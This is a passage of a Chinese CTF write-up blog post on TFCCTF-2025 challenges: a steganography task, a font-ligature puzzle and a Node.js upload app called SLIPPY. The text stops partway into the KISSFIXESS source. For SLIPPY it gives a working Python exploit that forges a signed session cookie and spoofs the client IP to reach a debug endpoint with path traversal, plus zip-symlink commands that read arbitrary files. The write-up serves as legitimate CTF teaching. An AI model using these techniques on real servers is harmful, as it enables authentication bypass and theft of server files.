<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TFCCTF-2025 | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DISCORD SHENANIGANS V5简单的零宽字符隐写，不多赘述 FONT LEAGUESGPT教学局 题目提供了两个文件：  index.html：简单页面，包含一个 &lt;textarea&gt;，指定使用自定义字体 Arial-custom.ttf。源码没有任何校验逻辑，只提示“如果正确你会看到一个 O”。 Arial-custom.ttf：定制字体文件。  题目名为 FONT L">
<meta property="og:type" content="article">
<meta property="og:title" content="TFCCTF-2025">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/08/29/TFCCTF-2025/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="DISCORD SHENANIGANS V5简单的零宽字符隐写，不多赘述 FONT LEAGUESGPT教学局 题目提供了两个文件：  index.html：简单页面，包含一个 &lt;textarea&gt;，指定使用自定义字体 Arial-custom.ttf。源码没有任何校验逻辑，只提示“如果正确你会看到一个 O”。 Arial-custom.ttf：定制字体文件。  题目名为 FONT L">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-08-29T10:17:49.000Z">
<meta property="article:modified_time" content="2025-09-02T12:37:14.560Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="pyjail">
<meta property="article:tag" content="xss">
<meta property="article:tag" content="软链接">
<meta property="article:tag" content="Mako SSTI">
<meta property="article:tag" content="bashFuck">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TFCCTF-2025",
  "url": "https://sakuraraindrop.github.io/2025/08/29/TFCCTF-2025/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-08-29T10:17:49.000Z",
  "dateModified": "2025-09-02T12:37:14.560Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/08/29/TFCCTF-2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TFCCTF-2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">TFCCTF-2025</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">TFCCTF-2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-29T10:17:49.000Z" title="发表于 2025-08-29 18:17:49">2025-08-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-02T12:37:14.560Z" title="更新于 2025-09-02 20:37:14">2025-09-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2025%E7%BA%BF%E4%B8%8A%E8%B5%9B/">2025线上赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="DISCORD-SHENANIGANS-V5"><a href="#DISCORD-SHENANIGANS-V5" class="headerlink" title="DISCORD SHENANIGANS V5"></a>DISCORD SHENANIGANS V5</h2><p>简单的零宽字符隐写，不多赘述</p>
<h2 id="FONT-LEAGUES"><a href="#FONT-LEAGUES" class="headerlink" title="FONT LEAGUES"></a>FONT LEAGUES</h2><p>GPT教学局</p>
<p>题目提供了两个文件：</p>
<ul>
<li><code>index.html</code>：简单页面，包含一个 <code>&lt;textarea&gt;</code>，指定使用自定义字体 <code>Arial-custom.ttf</code>。源码没有任何校验逻辑，只提示“如果正确你会看到一个 O”。</li>
<li><code>Arial-custom.ttf</code>：定制字体文件。</li>
</ul>
<p>题目名为 <strong>FONT LEAGUES</strong>，暗示考点与 <strong>字体替换&#x2F;连字机制 (OpenType GSUB)</strong> 有关。</p>
<h3 id="分析自定义字体"><a href="#分析自定义字体" class="headerlink" title="分析自定义字体"></a>分析自定义字体</h3><p>使用 <code>fontTools</code> 对 <code>Arial-custom.ttf</code> 进行解析，重点关注 <strong>GSUB (Glyph Substitution) 表</strong>。</p>
<ul>
<li>GSUB 表包含大量 <strong>LookupType&#x3D;4 (LigatureSubst)</strong> 规则。</li>
<li>这些规则将一串字形合成为一个新的字形，新字形命名规则类似：<br><code>O&lt;一长串哈希样的十六进制&gt;</code></li>
</ul>
<h3 id="确认最终目标字形"><a href="#确认最终目标字形" class="headerlink" title="确认最终目标字形"></a>确认最终目标字形</h3><p>我们希望找出<strong>页面所说的 “O” 字形</strong>。</p>
<ul>
<li>在所有 ligature 的”收敛字形”中，找到一个具有 <strong>双轮廓 (2 contours)</strong> 且边界框面积最大者。</li>
<li>确认其字形名为：<br><code>O162e219bca79a462f9cf5701124cf74c</code></li>
<li>这个字形渲染出来就是一个标准的圆环”O”，对应网页提示中的”正确结果”。</li>
</ul>
<h3 id="反向展开得到输入序列"><a href="#反向展开得到输入序列" class="headerlink" title="反向展开得到输入序列"></a>反向展开得到输入序列</h3><p>从 <code>O162e219bca79a462f9cf5701124cf74c</code> 反向回溯 ligature 规则：</p>
<ul>
<li>每个字形会被展开成一组基础字形。</li>
<li>基础字形名如 <code>one, two, a, b, f, ...</code>，正好对应 <strong>十六进制字符</strong>。</li>
</ul>
<p>最终得到的展开序列拼接后是一个 <strong>64 位十六进制字符串</strong>：<br><code>1f89a957a0816e3bea3fa026cd9a47cf181fb2c0e0c9e9442a2c783b01c083d2</code></p>
<p>flag<code>TFCCTF&#123;1f89a957a0816e3bea3fa026cd9a47cf181fb2c0e0c9e9442a2c783b01c083d2&#125;</code></p>
<h2 id="SLIPPY"><a href="#SLIPPY" class="headerlink" title="SLIPPY"></a>SLIPPY</h2><p>index.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ensureSession = <span class="built_in">require</span>(<span class="string">&#x27;../middleware/session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> developmentOnly = <span class="built_in">require</span>(<span class="string">&#x27;../middleware/developmentOnly&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">use</span>(ensureSession);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: <span class="string">&#x27;/tmp&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">sessionId</span>: req.<span class="property">session</span>.<span class="property">userId</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;zipfile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> zipPath = req.<span class="property">file</span>.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">  </span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(userDir, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Command: unzip temp/file.zip -d target_dir</span></span><br><span class="line">    <span class="title function_">execFile</span>(<span class="string">&#x27;unzip&#x27;</span>, [zipPath, <span class="string">&#x27;-d&#x27;</span>, userDir], <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">unlinkSync</span>(zipPath); <span class="comment">// Clean up temp file</span></span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Unzip failed:&#x27;</span>, stderr);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unzip error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/files&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/files&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">  fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/files/:filename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">    <span class="keyword">const</span> requestedPath = path.<span class="title function_">normalize</span>(req.<span class="property">params</span>.<span class="property">filename</span>);</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">resolve</span>(userDir, requestedPath);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Prevent path traversal</span></span><br><span class="line">    <span class="keyword">if</span> (!filePath.<span class="title function_">startsWith</span>(path.<span class="title function_">resolve</span>(userDir))) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file path&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(filePath) &amp;&amp; fs.<span class="title function_">statSync</span>(filePath).<span class="title function_">isFile</span>()) &#123;</span><br><span class="line">      res.<span class="title function_">download</span>(filePath);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/debug/files&#x27;</span>, developmentOnly, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">query</span>.<span class="property">session_id</span>);</span><br><span class="line">    fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>普通用户可以通过符号链接读取服务器的任意文件，但是由于flag.txt的路径随机，所以需要先想办法列出根目录的文件夹，明显是通过 <code>/debug/files</code> 来实现，但是调用这个接口需要先进入develop模式。</p>
<p>由于目前已经可以实现任意文件读，因此我们可以直接读取 <code>/app/.env</code> 和 <code>/app/server.js</code> ，从而伪造 connect.sid</p>
<p>伪造并列出根目录的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASE_URL = &quot;http://127.0.0.1:3000&quot;   # ← 改成题目服务地址</span></span><br><span class="line">BASE_URL = <span class="string">&quot;https://web-slippy-ab436954315562b3.challs.tfcctf.com&quot;</span>   <span class="comment"># ← 改成题目服务地址</span></span><br><span class="line">SESSION_SECRET = <span class="string">&quot;3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b&quot;</span></span><br><span class="line">DEV_SID = <span class="string">&quot;amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E&quot;</span>  <span class="comment"># 从 /app/server.js 读到的那串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_signature</span>(<span class="params">value: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    sig = hmac.new(secret.encode(), value.encode(), sha256).digest()</span><br><span class="line">    b64 = base64.b64encode(sig).decode()</span><br><span class="line">    <span class="comment"># cookie-signature：去掉 &#x27;=&#x27; 并做 URL-safe 置换</span></span><br><span class="line">    b64 = b64.rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">    b64 = b64.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> b64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_connect_sid</span>(<span class="params">sid: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;s:<span class="subst">&#123;sid&#125;</span>.<span class="subst">&#123;cookie_signature(sid, secret)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    cookie_val = make_connect_sid(DEV_SID, SESSION_SECRET)</span><br><span class="line">    cookies = &#123;<span class="string">&quot;connect.sid&quot;</span>: cookie_val&#125;</span><br><span class="line">    insecure = <span class="string">&quot;store_true&quot;</span></span><br><span class="line">    verify = <span class="keyword">not</span> insecure</span><br><span class="line">    headers = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;  <span class="comment"># 因为 app.set(&#x27;trust proxy&#x27;, true) 且中间件检查 req.ip</span></span><br><span class="line">    r = requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/debug/files&quot;</span>,</span><br><span class="line">                     params=&#123;<span class="string">&quot;session_id&quot;</span>: <span class="string">&quot;../../../../&quot;</span>&#125;,</span><br><span class="line">                     cookies=cookies, headers=headers, timeout=<span class="number">10</span>, verify=verify)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Status:&quot;</span>, r.status_code)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /tlhedn6f/flag.txt pwnlink</span><br><span class="line">zip -y pwn.zip pwnlink</span><br></pre></td></tr></table></figure>

<p>上传pwn.zip再download即可获取flag</p>
<p>flag<code>TFCCTF&#123;3at_sl1P_h4Ck_r3p3at_5af9f1&#125;</code></p>
<h2 id="KISSFIXESS"><a href="#KISSFIXESS" class="headerlink" title="KISSFIXESS"></a>KISSFIXESS</h2><p>main.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span 